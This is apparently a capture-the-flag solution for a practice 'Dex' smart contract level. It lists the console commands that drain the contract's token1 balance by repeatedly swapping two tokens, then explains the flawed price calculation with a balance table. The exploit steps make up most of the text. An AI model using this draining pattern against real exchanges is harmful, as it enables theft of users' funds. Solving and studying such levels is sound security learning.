Solution:
Approve the contract to spend plenty of tokens:
await contract.approve(contract.address, 1000)

Save the address of the two tokens we are swapping:
ta1 = await contract.token1()
ta2 = await contract.token2()

Swap all of players token1 for the contracts token2:
await contract.swap(ta1, ta2, 10)
Swap all of players token2 for the contracts token1.
await contract.swap(ta2, ta1, 20)
Repeat this process until the contract has a token 1 balance of 0.
await contract.swap(ta1, ta2, 24)
await contract.swap(ta2, ta1, 30)
await contract.swap(ta1, ta2, 41)
await contract.swap(ta2, ta1, 45)

Can see contract's token 1 balance of 0:
await contract.balanceOf(ta1, contract.address).then(v => v.toString())

OTHER NOTES:
*Table below shows,this works because the getSwapPrice() calculates the 
exchange rate incorrectly.  The division expects a float, but leads to 
an integer (Solidiy has no fractions).  So the player gets a bit more tokens
than before with each swap.  Hence, with enough they can eventually drain 
the contract.

      DEX       |        player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10
  110     90    |   0       20    
  86      110   |   24      0    
  110     80    |   0       30    
  69      110   |   41      0    
  110     45    |   0       65   
  0       90    |   110     20